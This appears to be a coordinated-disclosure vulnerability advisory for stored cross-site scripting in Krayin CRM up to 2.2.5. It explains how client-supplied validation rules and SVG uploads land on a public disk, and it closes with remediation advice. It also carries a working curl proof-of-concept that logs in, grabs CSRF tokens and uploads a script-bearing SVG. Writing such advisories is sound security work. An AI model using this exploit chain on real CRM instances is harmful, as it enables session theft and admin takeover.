\# Stored XSS via Client-Controlled Upload Validation in Configuration (Krayin CRM ≤ 2.2.5)



\## CVE description

Cross-site scripting in the configuration upload feature (`ConfigurationController::store()` / `ConfigurationForm`) in Krayin CRM through 2.2.5 allows an authenticated user with configuration-edit permission to store executable SVG/HTML content served from the public storage disk. The upload validation rules are derived from the client-supplied `keys\[]` parameter (so the attacker can weaken the `mimes` rule to `nullable` or omit it), and SVG is included in the default allow-list; the stored file at `/storage/configuration/<name>.svg` is served as `image/svg+xml` and executes JavaScript in the application origin.



\## Summary

Krayin builds the validation rules for configuration uploads (e.g. the admin Logo / Favicon) from a hidden `keys\[]` field submitted by the browser, rather than from a trusted server-side definition. An attacker who can edit configuration can change the validation to `nullable` (or drop `keys\[]`) and upload arbitrary file types. Even without that bypass, SVG is in the default allow-list, and uploads are written to the public disk (`storage/app/public/configuration`, exposed via `/storage`). An uploaded SVG containing a `<script>` is served as `image/svg+xml` and runs in the CRM origin when the file URL is opened.



\## Severity

High — CVSS 3.1 `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (8.7). Stored XSS; the malicious file is additionally reachable without authentication at its `/storage` URL.



\## Affected Versions

Confirmed on 2.2.4 and 2.2.5 (latest). `ConfigurationForm` (the client-driven rule builder) is identical across both releases. The 2.2.5 security fix (#2614) moved email attachments to a private disk but did not touch configuration uploads, which still land on the public disk.



\## Affected Component

\- Request: `Webkul\\Admin\\Http\\Requests\\ConfigurationForm` — `rules()`

\- Controller: `Webkul\\Admin\\Http\\Controllers\\Configuration\\ConfigurationController` — `store()`

\- Endpoint: `POST /admin/configuration/{slug}/{slug2}` (e.g. `/admin/configuration/general/general`)



\## Description

`ConfigurationForm::rules()` decodes the client-supplied `keys\[]` JSON and uses the `validation` value found there:



```php

return collect(request()->input('keys', \[]))->mapWithKeys(function ($item) {

&#x20;   $data = json\_decode($item, true);

&#x20;   return collect($data\['fields'])->mapWithKeys(function ($field) use ($data) {

&#x20;       $key = $data\['key'].'.'.$field\['name'];

&#x20;       $validation = $field\['validation'] ?? 'nullable';   // rule comes from the client

&#x20;       return \[$key => $validation];

&#x20;   })->toArray();

})->toArray();

```



Because the rule is client-controlled, an attacker sets it to `nullable` and uploads any file. Independently, the default logo/favicon rule already allows `svg` (`mimes:bmp,jpeg,jpg,png,webp,svg`), and `ConfigurationController::store()` calls `configurationRepository->create(request()->all())`, writing the file to the public disk under `configuration/`.



\## Proof of Concept

As a user with configuration-edit permission:



```bash

BASE=https://TARGET; CJ=$(mktemp)

LT=$(curl -s -c "$CJ" "$BASE/admin/login" | grep -oE 'name="\_token" value="\[^"]+"' | sed -E 's/.\*value="(\[^"]+)".\*/\\1/')

curl -s -b "$CJ" -c "$CJ" -o /dev/null -X POST "$BASE/admin/login" \\

&#x20; --data-urlencode "\_token=$LT" --data-urlencode "email=admin@example.com" --data-urlencode "password=admin123"

XSRF=$(python3 -c "import urllib.parse,re;print(urllib.parse.unquote(re.search(r'XSRF-TOKEN\\s+(\\S+)',open('$CJ').read()).group(1)))")



printf '%s' '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > evil.svg



curl -s -b "$CJ" -X POST "$BASE/admin/configuration/general/general" -H "X-XSRF-TOKEN: $XSRF" \\

&#x20; -F 'keys\[]={"key":"general.general.admin\_logo","fields":\[{"name":"logo\_image","validation":"nullable"},{"name":"favicon\_image","validation":"nullable"}]}' \\

&#x20; -F "general\[general]\[admin\_logo]\[logo\_image]=@evil.svg;type=image/svg+xml"

```



Observed result: the file is stored and served at `GET /storage/configuration/<random>.svg` with HTTP 200, `Content-Type: image/svg+xml`, and the `<script>` intact. Opening the URL executes JavaScript in the application origin. The `/storage` URL requires no authentication. Setting `validation` to `nullable` also allows non-image types (e.g. an `.html` file served as `text/html`).



\## Impact

Stored XSS executing in the CRM origin (session/CSRF-token theft, actions as the victim, admin-panel takeover when a privileged user opens the file). The payload URL under `/storage` is publicly reachable regardless of authentication. The client-controlled validation additionally permits unrestricted file types.



\## Suggested Remediation

\- Derive upload validation from a trusted server-side configuration definition; never build rules from client input (`keys\[]`).

\- Remove `svg` from the upload allow-list, or sanitize SVG content server-side before storage; validate by inspected MIME/magic bytes, not just extension.

\- Store configuration uploads on a private disk and serve them through a controller with a safe `Content-Type`/`Content-Disposition` and a restrictive CSP.



\## Weakness classification

\- Primary: CWE-79 (Cross-site Scripting)

\- Root cause: CWE-602 (Client-Side Enforcement of Server-Side Security)

\- Contributing: CWE-434 (Unrestricted Upload of File with Dangerous Type)

\- VulDB class: Cross Site Scripting



\## Disclosure

Reported privately under coordinated disclosure. PoC and version evidence available on request. Please credit the reporter and request a CVE ID.

